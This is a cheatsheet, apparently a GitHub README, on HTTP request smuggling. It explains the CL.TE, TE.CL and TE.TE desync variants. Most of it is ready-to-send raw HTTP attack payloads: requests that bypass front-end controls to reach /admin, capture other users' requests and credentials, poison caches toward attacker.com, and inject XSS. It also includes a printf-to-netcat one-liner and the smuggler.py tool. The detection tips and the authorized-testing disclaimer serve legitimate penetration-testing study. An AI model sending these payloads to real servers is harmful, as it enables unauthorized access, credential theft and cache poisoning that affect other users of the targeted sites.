# 📦 HTTP Request Smuggling Cheatsheet

<p align="center">
  <a href="translations/README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 What is Request Smuggling

**HTTP Request Smuggling** exploits discrepancies between how front-end (proxy) and back-end servers parse HTTP requests, allowing injection of additional requests.

### Impact
- 🔴 **Bypass security controls** - WAF/ACL bypass
- 🔴 **Poison web cache** - Cache malicious responses
- 🔴 **Steal credentials** - Capture other users' requests
- 🔴 **XSS** - Reflected XSS via smuggled request

---

## 🔍 How It Works

### Headers Involved
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Vulnerability Types
| Type | Front-end uses | Back-end uses |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Both obfuscated | One header ignored |

---

## 💉 Attack Payloads

### CL.TE (Content-Length → Transfer-Encoding)

**Front-end uses Content-Length, Back-end uses Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Exploit:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Front-end uses Transfer-Encoding, Back-end uses Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Obfuscated Transfer-Encoding)

```http
# Obfuscate TE header
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Exploitation Examples

### Bypass Front-End Security
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Capture Other Users' Requests
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Next user's request gets appended to `data=`*

### Cache Poisoning via Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS via Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Detection

### Timing-Based Detection
```http
# CL.TE Test
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# If back-end uses TE, it waits for "0" chunk
# Timeout = potentially vulnerable
```

### Differential Response
```http
# Send smuggled request that causes 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# If next response is 404 = vulnerable
```

---

## 🛠️ Tools

### Burp Suite Extension
```
1. Install "HTTP Request Smuggler" extension
2. Right-click request → Extensions → Launch Smuggle Probe
3. Check results for smuggling vulnerabilities
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Manual with curl
```bash
# Note: curl normalizes headers, may need raw TCP
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Quick Reference

### Detection Checklist
```markdown
- [ ] Check for proxy/load balancer (multiple servers)
- [ ] Test CL.TE timing
- [ ] Test TE.CL timing
- [ ] Try TE header obfuscation
- [ ] Verify with differential response
```

### Common Indicators
```
- Load balancers (AWS ALB, HAProxy)
- Reverse proxies (nginx, Apache)
- CDNs (Cloudflare, Akamai)
- HTTP/2 to HTTP/1.1 downgrade
```

---

## ⚠️ Important Notes

```
1. Testing can disrupt other users
2. Use isolated test environments when possible
3. Add unique identifiers to detect your requests
4. Report responsibly with PoC
```

---

## 📚 Resources

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler Tool](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Smuggle Requests!</b><br>
  <i>For authorized testing only!</i>
</p>
